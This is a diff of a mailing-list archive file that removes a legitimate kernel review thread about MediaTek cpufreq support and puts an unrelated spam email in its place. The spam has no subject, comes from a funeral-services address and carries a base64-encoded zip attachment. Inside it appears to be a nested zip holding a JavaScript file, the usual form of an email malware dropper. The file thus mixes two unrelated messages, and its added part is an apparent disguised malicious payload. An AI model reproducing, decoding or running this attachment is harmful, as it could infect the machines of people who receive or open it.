@@ -1,140 +1,80 @@
-From: Matthias Brugger <matthias.bgg@gmail.com>
-Subject: Re: [PATCH v3 1/3] cpufreq: mediatek: Add support of cpufreq to
- MT2701/MT7623 SoC
-Date: Mon, 10 Jul 2017 14:05:53 +0200
-Message-ID: <d77f367b-75db-ca23-f334-9bd6154ee26a@gmail.com>
-References: <cover.1499399121.git.sean.wang@mediatek.com>
- <de42e68d86dd161bb18b4ca7f27774c63c1bd55d.1499399121.git.sean.wang@mediatek.com>
- <1499412649.4449.33.camel@suse.de> <1499495426.16278.9.camel@mtkswgap22>
+From: <brian@oakcrestfuneralservices.com>
+Subject: (unknown)
+Date: Mon, 10 Jul 2017 12:43:08 -0000
+Message-ID: <149969058882.17620.2349432615542949447@telenet.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8; format=flowed
-Content-Transfer-Encoding: 7bit
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <1499495426.16278.9.camel@mtkswgap22>
-Content-Language: en-US
-Sender: linux-kernel-owner@vger.kernel.org
-To: Sean Wang <sean.wang@mediatek.com>, Jean Delvare <jdelvare@suse.de>
-Cc: viresh.kumar@linaro.org, robh+dt@kernel.org, mark.rutland@arm.com, jamesjj.liao@mediatek.com, p.zabel@pengutronix.de, shunli.wang@mediatek.com, erin.lo@mediatek.com, devicetree@vger.kernel.org, linux-mediatek@lists.infradead.org, linux-pm@vger.kernel.org, linux-arm-kernel@lists.infradead.org, linux-kernel@vger.kernel.org
+Content-Type: application/zip; name="402377184145.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-pm-owner@vger.kernel.org>
+Received: from 197.214-31-94.telenet.ru ([94.31.214.197]:54384 "HELO
+        telenet.ru" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1753715AbdGJMnM (ORCPT <rfc822;linux-pm@vger.kernel.org>);
+        Mon, 10 Jul 2017 08:43:12 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: linux-pm-owner@vger.kernel.org
 List-Id: linux-pm@vger.kernel.org
+To: linux-pm@vger.kernel.org
 
-
-
-On 07/08/2017 08:30 AM, Sean Wang wrote:
-> On Fri, 2017-07-07 at 09:30 +0200, Jean Delvare wrote:
->> Hi Sean,
->>
->> On ven., 2017-07-07 at 11:56 +0800, sean.wang@mediatek.com wrote:
->>> From: Sean Wang <sean.wang@mediatek.com>
->>>
->>> MT2701/MT7623 is a 32-bit ARMv7 based quad-core (4 * Cortex-A7) with
->>> single cluster and this hardware is also compatible with the existing
->>> driver through enabling CPU frequency feature with operating-points-v2
->>> bindings. Also, this driver actually supports all MediaTek SoCs, the
->>> Kconfig menu entry and file name itself should be updated with more
->>> generic name to drop "MT8173"
->>>
->>> Signed-off-by: Sean Wang <sean.wang@mediatek.com>
->>> Acked-by: Viresh Kumar <viresh.kumar@linaro.org>
->>> ---
->>>   drivers/cpufreq/Kconfig.arm                         | 8 ++++----
->>>   drivers/cpufreq/Makefile                            | 2 +-
->>>   drivers/cpufreq/{mt8173-cpufreq.c => mtk-cpufreq.c} | 2 ++
->>>   3 files changed, 7 insertions(+), 5 deletions(-)
->>>   rename drivers/cpufreq/{mt8173-cpufreq.c => mtk-cpufreq.c} (99%)
->>>
->>> diff --git a/drivers/cpufreq/Kconfig.arm b/drivers/cpufreq/Kconfig.arm
->>> index 74ed7e9..79aece7 100644
->>> --- a/drivers/cpufreq/Kconfig.arm
->>> +++ b/drivers/cpufreq/Kconfig.arm
->>> @@ -87,14 +87,14 @@ config ARM_KIRKWOOD_CPUFREQ
->>>   	  This adds the CPUFreq driver for Marvell Kirkwood
->>>   	  SoCs.
->>>   
->>> -config ARM_MT8173_CPUFREQ
->>> -	tristate "Mediatek MT8173 CPUFreq support"
->>> +config ARM_MEDIATEK_CPUFREQ
->>> +	tristate "CPU Frequency scaling support for MediaTek SoCs"
->>>   	depends on ARCH_MEDIATEK && REGULATOR
->>> -	depends on ARM64 || (ARM_CPU_TOPOLOGY && COMPILE_TEST)
->>> +	depends on ARM || ARM64 || COMPILE_TEST
->>
->> This statement no longer serves any purpose. The whole Kconfig.arm file
->> depends on ARM || ARM64, so you can drop it. As a matter of fact no
->> other entry in this file has the dependency.
->>
-> 
-> Okay, the whole line seemed redundant for that's always true.
-> I will drop it in the next version.
-> 
->>>   	depends on !CPU_THERMAL || THERMAL
->>>   	select PM_OPP
->>>   	help
->>> -	  This adds the CPUFreq driver support for Mediatek MT8173 SoC.
->>> +	  This adds the CPUFreq driver support for MediaTek SoCs.
->>>   
->>>   config ARM_OMAP2PLUS_CPUFREQ
->>>   	bool "TI OMAP2+"
->>> diff --git a/drivers/cpufreq/Makefile b/drivers/cpufreq/Makefile
->>> index b7e78f0..4956f5d 100644
->>> --- a/drivers/cpufreq/Makefile
->>> +++ b/drivers/cpufreq/Makefile
->>> @@ -58,7 +58,7 @@ obj-$(CONFIG_ARM_EXYNOS5440_CPUFREQ)	+= exynos5440-cpufreq.o
->>>   obj-$(CONFIG_ARM_HIGHBANK_CPUFREQ)	+= highbank-cpufreq.o
->>>   obj-$(CONFIG_ARM_IMX6Q_CPUFREQ)		+= imx6q-cpufreq.o
->>>   obj-$(CONFIG_ARM_KIRKWOOD_CPUFREQ)	+= kirkwood-cpufreq.o
->>> -obj-$(CONFIG_ARM_MT8173_CPUFREQ)	+= mt8173-cpufreq.o
->>> +obj-$(CONFIG_ARM_MEDIATEK_CPUFREQ)	+= mtk-cpufreq.o
->>
->> I would have preferred mediatek-cpufreq. 3-letter abbreviations are
->> likely to collide and cause confusion at some point in time. However it
->> seems I am late to the party, I see that there are already many files
->> named mtk-* or *-mtk.*... So, so be it.
->>
->> Also the file describing the bindings is named cpufreq-mediatek.txt,
->> which is inconsistent... But the situation is the same for a few other
->> cpufreq drivers already, so I suppose this is acceptable.
->>
-> 
-> Agreed. I also prefer using whole name with mediatek as the
-> prefix than just abbreviation used. I will update it also in the
-> next version.
-> 
-> As for the file naming for other drivers, i feel it's okay for me
-> changing into mediatek as file prefix, but it still depends on
-> maintainers or original authors if they likes this.
-> 
-
-If you want to clean that up, be my guest. Other low-hanging fruits to 
-clean up would be the config options. Right now we have MEDIATEK, MTK 
-and MT65 in kconfig, which is a mess.
-
-Regards,
-Matthias
-
-> 
-> 	Sean
-> 
->>>   obj-$(CONFIG_ARM_OMAP2PLUS_CPUFREQ)	+= omap-cpufreq.o
->>>   obj-$(CONFIG_ARM_PXA2xx_CPUFREQ)	+= pxa2xx-cpufreq.o
->>>   obj-$(CONFIG_PXA3xx)			+= pxa3xx-cpufreq.o
->>> diff --git a/drivers/cpufreq/mt8173-cpufreq.c b/drivers/cpufreq/mtk-cpufreq.c
->>> similarity index 99%
->>> rename from drivers/cpufreq/mt8173-cpufreq.c
->>> rename to drivers/cpufreq/mtk-cpufreq.c
->>> index fd1886f..481ec77 100644
->>> --- a/drivers/cpufreq/mt8173-cpufreq.c
->>> +++ b/drivers/cpufreq/mtk-cpufreq.c
->>> @@ -575,6 +575,8 @@ static struct platform_driver mt8173_cpufreq_platdrv = {
->>>   
->>>   /* List of machines supported by this driver */
->>>   static const struct of_device_id mt8173_cpufreq_machines[] __initconst = {
->>> +	{ .compatible = "mediatek,mt2701", },
->>> +	{ .compatible = "mediatek,mt7623", },
->>>   	{ .compatible = "mediatek,mt817x", },
->>>   	{ .compatible = "mediatek,mt8173", },
->>>   	{ .compatible = "mediatek,mt8176", },
->>
->> Reviewed-by: Jean Delvare <jdelvare@suse.de>
->>
-> 
-> 
+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
